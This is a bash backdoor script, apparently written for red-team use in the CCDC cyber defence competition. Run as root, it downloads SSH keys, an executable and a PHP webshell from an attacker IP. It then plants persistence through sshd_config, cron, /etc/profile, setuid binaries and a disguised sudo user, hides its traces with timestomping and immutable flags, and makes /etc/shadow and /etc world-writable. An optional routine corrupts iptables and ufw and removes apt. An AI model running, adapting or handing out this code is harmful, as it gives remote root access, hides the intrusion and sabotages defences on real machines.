#!/bin/bash

#absolutely incurable dynamic spyware
#Linux backdoor script for CCDC. Test on stock Debian, CentOS, and FreeBSD
#you should run this as root

#this script: 
#	adds your key to to root's authorized_keys
#	adds an ADDITIONAL authorized_keys file somehwereon the filesystem, and sets sshd_config AuthorizedKeysFile to that location. 

#	transfers an executable of your choice to to a location of your choice, and sets an hourly crontab

#	adds a "white team" user to *hopefully* trick blue team in to not deleting it

#	looks for popular text editors and sets the setuid bit. This way any low privileged users can use the editors as root
#	(see https://gist.github.com/dergachev/7916152)



#additional features
# chattr +i all of the things!
# timestomps everything it touches
# attempts curl, wget (ftp? scp?) to transfer files in case there are missing binaries

#CHANGEME name of backdoor
backdoor_name="man-db"
#CHANGEME to where you want your additional authorized_keys file to be stored
hidden_authorized_keys=/tmp/authorized_keys
#CHANGEME to webroot
webroot=/var/www/html
webshell="admin.php"
#CHANGEME name/password of added users (i.e. "scorebot" "whiteteam", etc)
username="scorebot"
userpasswd="sup3rs3cr3t"
#CHANGEME to locally hosted webserver
attacker_ip="192.168.23.129"
#CHANGEME to port of webserver
attacker_port="8081"
#webserver should contain your authorized_keys file, ELF executable, and webshell of choice in the webroot

main()
{
	if [ "$(id -u)" != "0" ]; then
		echo "check ur privs. exiting" 1>&2
		exit 1
	fi

	#DETERMINE HOW WE WILL TRANSFER FILES, FETCH FILES, THEN BACKDOOR
	#wget
	wget_location=`command -v wget`
	curl_location=`command -v curl`
	if [[ -f $wget_location ]]
	then
		printf "Using WGET to transfer files\n"
		$wget_location http://$attacker_ip:$attacker_port/authorized_keys -q -O $hidden_authorized_keys
		$wget_location http://$attacker_ip:$attacker_port/backdoor -q -O /etc/cron.hourly/$backdoor_name > /dev/null
		$wget_location http://$attacker_ip:$attacker_port/webshell -q -O $webroot/$webshell > /dev/null
			getrekt
	elif [[ -f $curl_location ]]
	then 
	#curl
		printf "Using CURL to transfer files"
		$curl_location http://$attacker_ip:$attacker_port/authorized_keys > $hidden_authorized_keys 
		$curl_location http://$attacker_ip:$attacker_port/backdoor > /etc/cron.hourly/$backdoor_name
		$curl_location http://$attacker_ip:$attacker_port/webshell > $webroom/$webshell
		getrekt
	else
		echo "Error"
	#TODO FTP
	#TODO SCP
	fi

}

checkDistro()
{
	#determine if we are debian, centos, or fedora
	#debian
	testdebian=`cat /etc/lsb-release`
	testcentos=`rpm --query centos-release`
	testfedora=`cat /etc/fedora-release`
	if [[ $testdebian ]]; then
		return "debian"
		printf "We are on Debian\n"
	elif [[ $testfedora ]]; then
		return "fedora"
		printf "We are on Fedora\n"
	elif [[ $testcentos ]]; then
		return "centos"
		printf "We are on CentOS\n"
	else
		printf "We are on something else\n"
		return "other"
	fi
}

getrekt() {
	distro=checkDistro 

	#backdoor 1: use our hidden authorized_keys file for authentication
	printf "BACKDOORING AUTHORIZED_KEYS\n"
	touch -d "12 Jul 08" $hidden_authorized_keys
	chattr +i $hidden_authorized_keys
	sed -i '/AuthorizedKeysFile/c\AuthorizedKeysFile $hidden_authorized_keys' /etc/ssh/sshd_config
	sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
	chattr +i /etc/ssh/sshd_config
	# maybe AuthorizedKeysCommand to run a backdoor?

	#backdoor #2: cronjob backdoor
	printf "BACKDOORING VIA CRON\n"
	chmod +x /etc/cron.hourly/$backdoor_name
	chown root:root /etc/cron.hourly/$backdoor_name
	chmod +sss /etc/cron.hourly/$backdoor_name
	touch -d "12 Jul 08" /etc/cron.hourly/$backdoor_name
	chattr +i /etc/cron.hourly/$backdoor_name

	#backdoor #2: user profile backdoor trigger
	printf "BACKDOORING BASH PROFILE\n"
	echo "/etc/cron.hourly/$backdoor_name &" >> /etc/profile
	echo "/etc/cron.hourly/$backdoor_name &" >> /etc/skel/.profile
	touch -d "12 Jul 08" /etc/profile
	touch -d "12 Jul 08" /etc/skel/.profile
	chattr +i /etc/profile
	chattr +i /etc/skel/.profile

	#backdoor #3: adds a PHP webshell to the specified directory
	#already done
	printf "BACKDOORING VIA WEBSHELL\n"
	touch -d "12 Jul 08" $webroot/$webshell
	chattr +i $webroot/$webshell

	#backdoor #4: setuid bit on programs for easy r00tz
	printf "BACKDOORING VIA SETUID ON BINARIES\n"
	if chmod -f +sss `command -v nano`; then printf "nano setuid bit set\n"; fi
	if chmod -f +sss `command -v vi`; then printf "vi setuid bit set\n"; fi
	if chmod -f +sss `command -v vim`; then printf "vim setuid bit set\n"; fi
	if chmod -f +sss `command -v emacs`; then printf "emacs setuid bit set\n"; fi
	if chmod -f +sss `command -v cat`; then printf "cat setuid bit set\n"; fi
	if chmod -f +sss /bin/echo; then printf "echo setuid bit set\n"; fi
	if chmod -f +sss `command -v less`; then printf "less setuid bit set\n"; fi
	if chmod -f +sss `command -v more`; then printf "more setuid bit set\n"; fi
	if chmod -f +sss `command -v mv`; then printf "mv setuid bit set\n"; fi
	if chmod -f +sss `command -v cp`; then printf "cp setuid bit set\n"; fi
	if chmod -f +sss `command -v awk`; then printf "awk setuid bit set\n"; fi
	if chmod -f +sss `command -v find`; then printf "find setuid bit set\n"; fi
	if chmod -f +sss `command -v python`; then printf "python setuid bit set\n"; fi
	if chmod -f +sss `command -v perl`; then printf "perl setuid bit set\n"; fi
	if chmod -f +sss `command -v ruby`; then printf "ruby setuid bit set\n"; fi
	
	printf "BACKDOOR 5: ADDING A USER\\n"
	useradd $username
	if [[ `command -v sudo` ]]; then
		if ! usermod -aG sudo $username ; then
			echo "$username ALL=(ALL) ALL" >> /etc/sudoers
			printf "No sudo group. Adding $username to sudoers file the bad way"
		else
			printf "$username added to sudo group"
		fi
	else
		printf "Sudo not installed. Escalate via setuid binaries"
	fi
	echo "$username:$userpasswd" | chpasswd

	printf "BACKDOOR 6: CHMOD 777 EVERYTHING\n"
	if chmod -f 777 /etc/shadow ; then printf "/etc/shadow is now world writeable\n"; fi
	if chmod -f 777 /etc/passwd ; then printf "/etc/passwd is now world writeable\n"; fi
	if chmod -f 777 /etc/group ; then printf "/etc/group is now world writeable\n"; fi
	if chmod -f 777 /etc/sudoers ; then printf "/etc/sudoers is now world writeable\n"; fi
	if chmod -Rf 777 /root ; then printf "/root/* is world writeable\n"; fi
	if chmod -Rf 777 /etc ; then printf "/etc/* is world writeable\n"; fi


	#doublegetrekt()
}

doublegetrekt() {
	#backdoor #5: .bashrc readds existing backdoors 
	printf "BACKDOORING VIA BASHRC\n"
	echo "test" > /home/*/test
	echo "test" > /root/test
}

evilmode() {
	#corrupt some system binaries that blue team might want to use...
	if dd if=/dev/zero of=/sbin/iptables bs=1 count=1 seek=30000 conv=notrunc ; then printf "iptables corrupted\n"; fi
	if echo '#!/usr/bin/python' > /usr/sbin/ufw && echo 'print("YOU DIDNT SAY THE MAGIC WORD!!!!!!")' >> /usr/sbin/ufw; then printf "ufw corrupted\n"; fi
	if echo "Yes, do as I say!" | apt-get remove apt ; then printf "uninstalled apt"; fi

	if sed -i 's/a//' /usr/sbin/ufw ; then printf "ufw corrupted\n"; fi


}

main
